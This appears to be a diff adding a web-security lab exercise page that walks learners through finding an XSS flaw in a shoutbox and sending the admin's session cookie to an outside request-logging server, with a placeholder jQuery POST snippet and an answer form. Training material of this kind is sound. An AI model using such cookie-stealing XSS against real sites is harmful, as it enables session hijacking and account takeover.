@@ -1,0 +1,32 @@
+<h3>The Cookie Jar</h3>
+<ul>
+<li>Login using <pre>u=xss<br/>p=cookie_jar</pre> (or any of the ones you found in the previous exercise) </li>
+
+<li>Open up the <b>Web Developer Console</b> by pressing <b>Ctrl+Shift+K</b> from Firefox.  Type <pre> document.cookie </pre></li>
+</ul>
+
+<p>You’ll see the cookie details, like your 'id_my_site' and 'key_my_site'. If only we could just find a way to steal admin’s cookie and set it as our own, we would be accepted as being admin!</p>
+
+<ul>
+<li> Checkout the shoutbox page (/shout.php) .  You can try posting a message. Rumor has it that admin checks this page quite often</li>
+
+<li> Can you find a Cross Site Scripting vulnerability? Try pointing W3AF at the page shout.php. </li>
+
+<li> Turn off any discovery plugins.  Configure <b>xss</b> “audit” plugin. to find “cross-site-scripting” vulnerability. W3AF should find a few strings that cause cross site scripting<li> 
+
+<li>Craft an xss string that POSTs the cookie data to a listening server. We set one up for you at <a href="http://raxcity.com/sketch/requestbin.php">http://raxcity.com/sketch/requestbin.php</a>.  By simply sending post request here they will be logged and displayed <a href="http://raxcity.com/sketch/log.txt">here</a></li>
+</ul>
+
+<p> You can use the snippet of javascript below to help you steal cookies! </p>
+
+<pre>
+$.post&lt;DESTINATION_URL&gt;, &lt;POST_DATA&gt;)
+</pre>
+
+<blockquote> What is the admin's "key" for the site? 
+	<form method="post" action="/answer">
+	<input type="hidden" name="question" value="admin_cookie">
+	<input type="text" name="answer">
+	<button type="submit" class="btn btn-danger" >Submit</button>
+</form>
+</blockquote>
